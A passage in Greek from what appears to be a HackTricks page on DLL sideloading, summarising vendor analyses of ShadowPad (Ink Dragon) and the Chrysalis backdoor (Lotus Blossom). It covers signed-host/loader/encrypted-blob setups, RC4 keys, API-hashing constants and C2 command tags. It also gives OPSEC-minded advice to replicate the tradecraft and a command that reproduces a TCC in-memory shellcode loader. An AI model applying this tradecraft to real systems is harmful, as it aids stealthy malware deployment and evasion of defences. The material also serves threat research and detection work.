- KnownDLLs, SxS και forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (μελέτη περίπτωσης ShadowPad)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων** για να συγχωνευθεί με νόμιμο λογισμικό ενώ διατηρεί τον βασικό payload κρυπτογραφημένο στο δίσκο:

1. **Signed host EXE** – προμηθευτές όπως οι AMD, Realtek ή NVIDIA καταχρώνται (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο για να μοιάζει με Windows binary (π.χ. `conhost.exe`), αλλά η Authenticode υπογραφή παραμένει έγκυρη.
2. **Malicious loader DLL** – αποτίθεται δίπλα στο EXE με αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Η DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μοναδικός της ρόλος είναι να εντοπίσει το encrypted blob, να το decrypt-άρει, και να reflectively map-άρει το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκευμένο ως `<name>.tmp` στον ίδιο φάκελο. Μετά το memory-mapping του decrypted payload, ο loader διαγράφει το TMP αρχείο για να καταστρέψει τα forensic αποδεικτικά στοιχεία.

Tradecraft notes:

* Η μετονομασία του signed EXE (διατηρώντας το πρωτότυπο `OriginalFileName` στην PE header) επιτρέπει να μιμηθεί Windows binary αλλά να διατηρήσει την vendor υπογραφή, οπότε αναπαράγετε την πρακτική του Ink Dragon να αποθέτει `conhost.exe`-όμοια binaries που στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Εφόσον το εκτελέσιμο παραμένει trusted, οι περισσότερες allowlisting πολιτικές χρειάζονται μόνο τη malicious DLL δίπλα του. Επικεντρωθείτε στο customization του loader DLL· το signed parent συνήθως μπορεί να τρέξει χωρίς αλλαγές.
* Ο decryptor του ShadowPad περιμένει ότι το TMP blob θα βρίσκεται δίπλα στον loader και θα είναι writable ώστε να μηδενίσει το αρχείο μετά το mapping. Κρατήστε τον φάκελο writable μέχρι το payload να φορτωθεί· μόλις βρίσκεται στη μνήμη, το TMP αρχείο μπορεί να διαγραφεί με ασφάλεια για OPSEC.

## Μελέτη περίπτωσης: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom εκμεταλλεύτηκε μια αξιόπιστη αλυσίδα ενημέρωσης για να παραδώσει έναν NSIS-packed dropper που στάθμευσε ένα DLL sideload καθώς και πλήρως in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) δημιουργεί `%AppData%\Bluetooth`, το σήμαίνει **HIDDEN**, αποθέτει ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, μια malicious `log.dll`, και ένα encrypted blob `BluetoothService`, και μετά εκκινεί το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί `LogInit`/`LogWrite`. Το `LogInit` mmap-loads το blob· το `LogWrite` το decrypt-άρει με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material παράγεται από ένα προηγούμενο hash), υπεργράφει το buffer με plaintext shellcode, απελευθερώνει temps, και κάνει jump σε αυτό.
- Για να αποφευχθεί το IAT, ο loader επιλύει APIs κάνοντας hashing των export names χρησιμοποιώντας **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, έπειτα εφαρμόζοντας ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνοντας με salted target hashes.

Main shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα PE-like main module επαναλαμβάνοντας add/XOR/sub με key `gQ2JR&9;` σε πέντε περάσματα, έπειτα φορτώνει δυναμικά `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την ανάλυση imports.
- Ανακατασκευάζει τις DLL name strings στο runtime μέσω per-character bit-rotate/XOR μετασχηματισμών, έπειτα φορτώνει `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που διασχίζει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε 4-byte blocks με Murmur-style mixing, και καταφεύγει σε `GetProcAddress` μόνο αν το hash δεν βρεθεί.

Embedded configuration & C2
- Η configuration βρίσκεται μέσα στο dropped `BluetoothService` αρχείο στη θέση **offset 0x30808** (μέγεθος **0x980**) και αποκρυπτογραφείται με RC4 με key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons χτίζουν ένα dot-delimited host profile, προσθέτουν το tag `4Q` στην αρχή, μετά RC4-encrypt με key `vAuig34%^325hGV` πριν το `HttpSendRequestA` πάνω από HTTPS. Οι απαντήσεις αποκρυπτογραφούνται με RC4 και διανέμονται μέσω ενός tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode καθορίζεται από τα CLI args: χωρίς args = εγκαθιστά persistence (service/Run key) που δείχνει σε `-i`; `-i` επανεκκινεί τον εαυτό του με `-k`; `-k` παραλείπει την εγκατάσταση και τρέχει το payload.

Εναλλακτικός loader παρατηρήθηκε
- Η ίδια intrusion αποέθεσε το Tiny C Compiler και εκτέλεσε `svchost.exe -nostdlib -run conf.c` από `C:\ProgramData\USOShared\`, με `libtcc.dll` δίπλα του. Ο attacker-supplied C source ενσωμάτωσε shellcode, το compiled, και το έτρεξε in-memory χωρίς να ακουμπήσει το δίσκο με PE. Αναπαράγετε με:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτή η TCC-based compile-and-run φάση εισήγαγε το `Wininet.dll` κατά το runtime και τράβηξε ένα second-stage shellcode από ένα hardcoded URL, παρέχοντας έναν flexible loader που προσποιείται ότι είναι compiler run.

## Αναφορές

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
